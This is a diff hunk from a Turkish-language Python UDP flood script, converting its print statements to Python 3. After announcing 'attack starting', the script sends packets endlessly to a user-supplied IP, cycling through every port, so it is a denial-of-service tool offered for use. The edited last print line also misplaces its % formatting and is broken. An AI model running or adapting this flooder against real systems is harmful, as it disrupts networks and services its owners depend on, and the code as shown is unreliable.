@@ -26,21 +26,21 @@ port = input("Port : ")
 
 os.system("clear")
 os.system("figlet Saldırı Başlatılıyor")
-print "[                    ] 0% "
+print("[                    ] 0% ")
 time.sleep(5)
-print "[=====               ] 25%"
+print("[=====               ] 25%")
 time.sleep(5)
-print "[==========          ] 50%"
+print("[==========          ] 50%")
 time.sleep(5)
-print "[===============     ] 75%"
+print("[===============     ] 75%")
 time.sleep(5)
-print "[====================] 100%"
+print("[====================] 100%")
 time.sleep(3)
 gönderilen = 0
 while True:
   soket.sendto(baytlar, (ip,port))
   gönderilen = gönderilen + 1
   port = port + 1
-  print "%s IP adresine ve %s nolu porta %s paket gönderildi."%(ip,port,gönderilen)
+  print("%s IP adresine ve %s nolu porta %s paket gönderildi.")%(ip,port,gönderilen)
   if port == 65534:
        port = 1
